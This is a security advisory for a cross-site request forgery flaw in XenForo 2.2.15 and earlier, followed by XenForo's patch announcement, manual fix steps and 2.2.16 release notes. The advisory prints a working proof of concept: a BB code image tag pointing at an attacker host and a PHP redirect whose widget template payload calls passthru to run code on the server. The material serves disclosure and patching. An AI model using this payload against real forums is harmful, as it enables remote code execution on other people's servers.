# [KIS-2024-05] XenForo <= 2.2.15 (Widget::actionSave) Cross-Site Request Forgery Vulnerability

-------------------------------------------------------------------------------
XenForo <= 2.2.15 (Widget::actionSave) Cross-Site Request Forgery Vulnerability
-------------------------------------------------------------------------------

[-] Software Link:

<https://xenforo.com>

[-] Affected Versions:

Version 2.2.15 and prior versions.

[-] Vulnerability Description:

The XF\Admin\Controller\Widget::actionSave() method, defined into the
/src/XF/Admin/Controller/Widget.php script, does not check whether the
current HTTP request is a POST or a GET before saving a widget.
XenForo does perform anti-CSRF checks for POST requests only, as such
this method can be abused in a Cross-Site Request Forgery (CSRF)
attack to create/modify arbitrary XenForo widgets via GET requests,
and this can also be exploited in tandem with KIS-2024-06 to perform
CSRF-based Remote Code Execution (RCE) attacks.

Furthermore, XenForo implements a BB code system, as such this
vulnerability could also be exploited through "Stored CSRF" attacks by
abusing the [img] BB code tag, creating a thread or a private message
(to be sent to the victim user) like the following:

[img][https://attacker.website/exploit.php[/img](https://attacker.website/exploit.php%5B/img)]

Where the exploit.php script hosted on the attacker-controlled website
could be something like this:

<?php

$url = "[https://victim.website/xenforo/"](https://victim.website/xenforo/%22);;

header("Location:
{$url}admin.php?widgets/save&definition_id=html&widget_key=RCE&positions[pub_sidebar_top]=1&display_condition=true&options[template]={{\$xf.app.em.getRepository('XF\\Util\\Arr').filterRecursive(['id'],'passthru')}}");

?>

Successful exploitation of this vulnerability requires a victim user
with permissions to administer styles or widgets to be currently
logged into the Admin Control Panel.

[-] Solution:

Update to a fixed version or apply the vendor patches.

[-] Disclosure Timeline:

[22/02/2024] - Vulnerability details sent to SSD Secure Disclosure
[05/06/2024] - Vendor released patches and fixed versions
[14/06/2024] - CVE identifier requested
[16/06/2024] - CVE identifier assigned

* [Replies: 2](/community/threads/xenforo-2-1-15-patch-1-2-2-16-patch-2-and-xenforo-media-gallery-2-1-9-2-2-6-released-includes-security-fixes.222133/#posts)

## Security Fix​

Today we are advising all customers running XenForo that a potential security vulnerability has been identified. All affected customers should either upgrade to XenForo 2.1.15 or XenForo 2.2.16.

If you are a XenForo Cloud customer, a fix has been rolled out automatically, and no further action is required to address this issue.

If you are running a pre-release version of XenForo 2.3, you should follow the instructions in the announcement thread for the [XenForo 2.3.0 Release Candidate 1 release](https://xenforo.com/community/threads/xenforo-add-ons-2-3-0-release-candidate-1-released-unsupported-includes-security-fixes.222134/).

The issue relates to a potential cross-site request forgery and code injection vulnerability which could lead to a remote code execution (RCE) or cross-site scripting (XSS) exploit.

XenForo extends thanks to independent security researcher, Egidio Romano (EgiX), working with [SSD Secure Disclosure](https://ssd-disclosure.com/).

We recommend doing a full upgrade to resolve the issue, but a patch can be applied manually to any version. See below for further details.

## Applying a patch manually​

To patch this issue manually you will need to edit one file manually **and** upload some changed files.

### Step 1: Edit `src/XF.php`​

Find the following line in this file:

PHP:

```
        $parts = explode(':', $string, 3);
```

Replace that line with the following:

PHP:

```
        if (!$string) return '';

        if (strpos($string, ':') === false)
        {
            $pattern = '#^\\\?'
                . str_replace('%s', '([A-Za-z0-9_\\\]+)', preg_quote(ltrim($formatter, '\\')))
                . '$#';
            if (!preg_match($pattern, $string, $matches))
            {
                throw new \InvalidArgumentException(sprintf(
                    'Class %s does not match formatter pattern %s',
                    $string,
                    $formatter
                ));
            }

            // already a class
            return $string;
        }

        $parts = explode(':', $string, 3);
```

**Note:** This file is not included in the patch download attached to this post as it contains install-specific data. You **must** apply this change manually to any XenForo installation running XenForo 2.1 or 2.2 to effectively fix the issue. This only applies if you are unable to do a normal upgrade.

### Step 2: Upload XF files​

* Download either `2115-patch.zip` (for XenForo 2.1) or `2216-patch.zip` (for XenForo 2.2).
* Extract the .zip file
* Upload the **contents** of the `upload` directory to the **root** of your XenForo installation

### Step 3: Upload XFMG files (for XenForo Media Gallery customers only)​

* Download either `xfmg219-patch.zip` (for XenForo Media Gallery 2.1) or `xfmg226-patch.zip` (for XenForo Media Gallery 2.2).
* Extract the .zip file
* Upload the **contents** of the `upload` directory to the **root** of your XenForo installation

**Note:** If you decide to patch the files instead of doing full upgrades, your "File health check" will report these files as having "Unexpected contents". Because these files no longer contain the same contents your version of XF was shipped with, this is expected and can be safely ignored.

As always, new releases of XenForo are free to download for all customers with active licenses, who may now grab the new version from the [customer area](https://xenforo.com/customers) or upgrade from your Admin control panel (Tools > Check for upgrades...).

## XenForo 2.2.16 Released​

XenForo 2.2.16 is now available for all licensed customers to download. We strongly recommend that all customers running previous versions of XenForo 2.2 upgrade to this release to benefit from increased stability.

## [One-click upgrade to XenForo 2.2.16](https://xenforo.com/goto/oc-upgrade-help)​

[**Directly from your admin control panel**](https://xenforo.com/goto/oc-upgrade-help)

If you are a XenForo Cloud customer, your upgrade will be scheduled automatically.

Some of the changes in XF 2.2.16 include:

* [Fix some issues with xf-dev:class-use-function to better support classes with class attributes and comments, or existing use function declarations.](https://xenforo.com/community/threads/203639)

* [Include a plain confirmation URL in the email sent to users awaiting email confirmation](https://xenforo.com/community/threads/213727)

As always, new releases of XenForo are free to download for all customers with active licenses. You may now [upgrade from your admin control panel](https://xenforo.com/goto/oc-upgrade-help) or grab the new version from the [customer area](https://xenforo.com/customers).

### Current requirements​

Please note that XenForo 2.2 has higher system requirements than earlier versions.

The following are *minimum* requirements:

* PHP 7.2 or newer (PHP 8.2 recommended)
* MySQL 5.5 and newer (Also compatible with MariaDB/Percona etc.)
* All of the official add-ons require XenForo 2.2.
* Enhanced Search requires at least Elasticsearch 2.0.

### Installation and upgrade instructions​

Full details of how to [**install** and **upgrade**](https://xenforo.com/docs/xf2/install-upgrade/) XenForo can be found in the [XenForo 2 Manual](https://xenforo.com/xf2-docs/manual/). We strongly recommend [upgrading directly from within your control panel](https://xenforo.com/goto/oc-upgrade-help).

## XenForo 2.1.15 Patch 1 & 2.2.16 Patch 1 Released​

About **30 seconds** after we released 2.1.15 and 2.2.16 we were notified of a very old bug that was surfaced by the new changes.

![Great Job Reaction GIF](https://media2.giphy.com/media/XreQmk7ETCak0/200.gif "Great Job Reaction GIF")

The issue relates to editing node-like permissions.

As such, we have released Patch 1 for both versions to address this.

The patches above have been modified and include two additional files:

* `src/XF/Admin/Controller/Node.php`
* `src/XF/Admin/Controller/Permission.php`

You should re-apply the patch if you are unable to upgrade.

## XenForo 2.2.16 Patch 2 Released​

Firstly, to clarify some concerns that have arisen:

1. If you did a normal upgrade (either uploading files or via your admin control panel) you do not need to manually edit any files to receive the security fixes.

2. If you upgraded to the initial 2.2.16 release, you are fully protected against the security issues that were being addressed.

Secondly, a second patch is being released to address some minor bug fixes that may not have been correctly applied when upgrading to XenForo 2.2.16. This is only applicable if you performed a normal upgrade to 2.2.16, and this patch is not security related or affected by the security fixes.

You can download that now from your customer area or perform a one-click upgrade through your admin control panel. You can go to Tools > Check for upgrades in order to see the second patch release.

If you are running XenForo Cloud, the fixes have been applied automatically.
